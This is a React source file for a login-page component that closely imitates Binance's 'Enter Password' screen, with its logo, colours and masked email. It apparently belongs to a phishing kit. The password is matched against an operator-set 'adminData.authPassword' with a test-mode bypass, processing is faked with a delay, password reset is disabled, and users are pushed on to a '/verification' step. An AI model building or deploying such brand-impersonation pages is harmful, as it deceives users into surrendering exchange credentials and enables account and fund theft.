import { useState, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { useApp } from '@/contexts/AppContext';
import { maskEmail } from '@/utils/validation';
import { LoadingBars } from '@/components/LoadingBars';
import { Eye, EyeOff } from 'lucide-react';

export function Password() {
  const navigate = useNavigate();
  const { adminData, showToast } = useApp();
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);

  const loginIdentifier = sessionStorage.getItem('loginIdentifier') || 'user@example.com';
  const maskedIdentifier = maskEmail(loginIdentifier);

  const handleLogin = async () => {
    if (!password) {
      if (inputRef.current) {
        inputRef.current.style.borderColor = '#f6465d';
        setTimeout(() => {
          if (inputRef.current) {
            inputRef.current.style.borderColor = '#F0B90B';
          }
        }, 2000);
      }
      return;
    }

    setIsLoading(true);

    // Simulate processing (2s)
    await new Promise(resolve => setTimeout(resolve, 2000));

    // Validate password against admin setting (or test mode)
    const isValid = adminData.testMode || password === adminData.authPassword;

    setIsLoading(false);

    if (isValid) {
      navigate('/verification');
    } else {
      showToast('Invalid password. Please try again.', 'error');
      setPassword('');
    }
  };

  const handleKeyPress = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter') {
      handleLogin();
    }
  };

  const handleForgotPassword = () => {
    showToast('Password reset unavailable right now', 'info');
  };

  const handleDifferentAccount = () => {
    sessionStorage.removeItem('loginIdentifier');
    navigate('/');
  };

  return (
    <div className="min-h-screen bg-[#1D252B] flex flex-col">
      <div className="flex-1 flex flex-col px-5 sm:px-6 pt-5 pb-1 max-w-[400px] mx-auto w-full">
        {/* Logo */}
        <div className="flex items-center gap-2 mb-10 self-start">
          <img src="/source/logo.png" alt="Binance" className="h-8 w-auto block" />
        </div>

        <h1 className="text-[32px] font-semibold mb-3 text-white tracking-tight">Enter Password</h1>

        <div className="text-base text-[#848E9C] mb-8">{maskedIdentifier}</div>

        <label className="block text-sm text-[#848E9C] mb-2">Password</label>

        <div className="relative mb-4">
          <input
            ref={inputRef}
            type={showPassword ? 'text' : 'password'}
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            onKeyPress={handleKeyPress}
            placeholder="Enter your password"
            className="w-full px-4 py-4 pr-12 bg-[#2B3139] border-[1.5px] border-[#F0B90B] rounded-xl text-[#EAECEF] text-base outline-none transition-colors placeholder:text-[#5E6673]"
          />
          <button
            onClick={() => setShowPassword(!showPassword)}
            className="absolute right-4 top-1/2 -translate-y-1/2 text-[#848E9C] hover:text-white transition-colors"
          >
            {showPassword ? (
              <EyeOff className="w-5 h-5" />
            ) : (
              <Eye className="w-5 h-5" />
            )}
          </button>
        </div>

        <button
          onClick={handleLogin}
          disabled={isLoading}
          className="w-full bg-[#FCD535] text-[#1E2329] border-none rounded-xl font-semibold cursor-pointer mt-2 transition-colors flex items-center justify-center h-12 sm:h-[52px] md:h-12 lg:h-11 px-5 sm:px-6 md:px-8 lg:px-10 text-base sm:text-[17px] md:text-base hover:bg-[#F0B90B] disabled:opacity-50 disabled:cursor-not-allowed"
        >
          {isLoading ? (
            <LoadingBars color="bg-[#1E2329]" />
          ) : (
            'Log In'
          )}
        </button>

        <div className="mt-12 flex flex-col gap-6">
          <button
            onClick={handleForgotPassword}
            className="text-[#F0B90B] text-base font-medium text-left hover:underline"
          >
            Forgot password?
          </button>
          <button
            onClick={handleDifferentAccount}
            className="text-[#F0B90B] text-base font-medium text-left hover:underline"
          >
            Use a different account
          </button>
        </div>
      </div>

      {/* Footer */}
      <div className="py-6 px-4 flex justify-center items-center gap-8 text-sm text-[#848E9C]">
        <button className="flex items-center gap-2 hover:text-[#EAECEF] transition-colors bg-transparent border-none">
          <svg className="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
            <circle cx="12" cy="12" r="10"/>
            <path d="M2 12h20M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/>
          </svg>
          English
        </button>
        <button className="hover:text-[#EAECEF] transition-colors bg-transparent border-none text-[#848E9C]">Cookies</button>
        <button className="hover:text-[#EAECEF] transition-colors bg-transparent border-none text-[#848E9C]">Privacy</button>
      </div>
    </div>
  );
}

export default Password;
